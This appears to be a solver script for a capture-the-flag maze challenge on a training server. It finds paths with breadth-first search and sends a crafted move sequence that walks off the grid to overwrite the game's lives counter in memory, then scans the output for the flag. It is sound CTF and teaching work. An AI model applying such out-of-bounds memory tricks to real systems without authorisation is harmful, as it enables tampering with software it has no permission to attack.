import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
from collections import deque
HOST, PORT = "chatelaine.cylabacademy.net", 25092


def recv_until_grid(s, timeout=8.0):
    s.settimeout(timeout)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
        txt = buf.decode("utf-8", "replace")
        lines = txt.split("\n")
        for i, l in enumerate(lines):
            if "Lives left:" in l:
                g = lines[i + 1:i + 31]
                if len(g) >= 30 and all(len(x) >= 80 for x in g):
                    return g, txt
    return None, buf.decode("utf-8", "replace")


def find(grid, ch):
    for y, row in enumerate(grid):
        x = row.find(ch)
        if x >= 0:
            return (y, x)
    return None


def bfs(grid, start, goal):
    q = deque([start])
    prev = {start: None}
    while q:
        cur = q.popleft()
        if cur == goal:
            path = []
            while prev[cur] is not None:
                p, d = prev[cur]
                path.append(d)
                cur = p
            return "".join(reversed(path))
        for d, (dy, dx) in (("s", (1, 0)), ("w", (-1, 0)), ("d", (0, 1)), ("a", (0, -1))):
            ny, nx = cur[0] + dy, cur[1] + dx
            if 0 <= ny < len(grid) and 0 <= nx < len(grid[0]) and grid[ny][nx] != "#":
                if (ny, nx) not in prev:
                    prev[(ny, nx)] = (cur, d)
                    q.append((ny, nx))
    return None


s = socket.create_connection((HOST, PORT), timeout=30)
grid, txt = recv_until_grid(s)
print("grille:", grid is not None, "joueur:", find(grid, "@") if grid else None)
plan = ""
for level in range(6):
    if grid is None:
        grid, txt = recv_until_grid(s)
        if grid is None:
            print("plus de grille au niveau", level)
            break
    start = find(grid, "@")
    goal = find(grid, "X")
    print(f"niveau {level+1}: joueur={start} sortie={goal}")
    # 1) rejoindre (1,0) par BFS, puis sortir a gauche et remonter pour ecraser les vies
    p1 = bfs(grid, start, (1, 0))
    if p1 is None:
        print("  (1,0) inaccessible")
        break
    exploit = p1 + "a" + "w" + "a" * 6 + "d" * 3 + "d" * 3 + "s" + "d"
    # 2) BFS depuis (1,0) vers la sortie
    p2 = bfs(grid, (1, 0), goal)
    if p2 is None:
        print("  sortie inaccessible")
        break
    seq = exploit + p2
    s.sendall(seq.encode())
    time.sleep(0.3)
    grid, txt = recv_until_grid(s, 10.0)
    if "You win" in txt:
        print("  niveau gagne")
    if "No more lives" in txt or "obstacle" in txt:
        print("  echec:", txt[-120:].replace("\n", " "))
        break
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
    if m:
        print("FLAG:", m.group(0))
        break
s.close()
